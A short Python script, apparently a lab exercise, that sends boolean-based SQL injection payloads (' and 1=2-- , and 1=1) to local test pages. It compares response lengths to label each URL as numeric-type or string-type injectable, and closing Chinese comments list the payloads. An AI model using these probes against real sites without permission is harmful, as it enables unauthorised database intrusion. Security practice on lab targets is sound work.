import requests

urls=['http://127.0.0.1/sqlinjection/int.php?id=1','http://127.0.0.1/sqlinjection/str.php?id=1']


for url in urls:
    
    payload_str="' and 1=2-- "
    payload_int=" and 1=2"

    sql_url1=url+payload_str
    #http://127.0.0.1/sqlinjection/int.php?id=1' and 1=2-- 
    #http://127.0.0.1/sqlinjection/int.php?id=1' and 1=1-- 
    sql_url2=url+payload_int
    #http://127.0.0.1/sqlinjection/int.php?id=1 and 1=2
    #http://127.0.0.1/sqlinjection/int.php?id=1 and 1=1

    response=requests.get(url=sql_url1)

    origin_len=len(requests.get(url=url).text)
    print(origin_len,len(response.text))
    if(len(response.text)==origin_len):
        response2=requests.get(url=sql_url2)
        print(len(response2.text),origin_len)
        if(len(response2.text)!=origin_len):
            payload_int2=" and 1=1"
            sql_url4=url+payload_int2
            print(sql_url4)
            response4=requests.get(url=sql_url4)
            if(len(response4.text)==origin_len):
                print(url+"数字型注入")
    else:
        payload_str2="' and 1=1-- "
        sql_url3=url+payload_str2
        response3=requests.get(url=sql_url3)
        print(len(response3.text),origin_len)
        if(len(response3.text)==origin_len):
            print(url+"字符型注入")
            break
        response2=requests.get(url=sql_url2)
        if(len(response2.text)!=origin_len):
            payload_int2=" and 1=1"
            sql_url4=url+payload_int2
            print(sql_url4)
            response4=requests.get(url=sql_url4)
            if(len(response4.text)==origin_len):
                print(url+"数字型注入")


#字符型注入payload：' and 1=2-- 
#数字型注入payload：and 1=2
#insert型注入payload：)
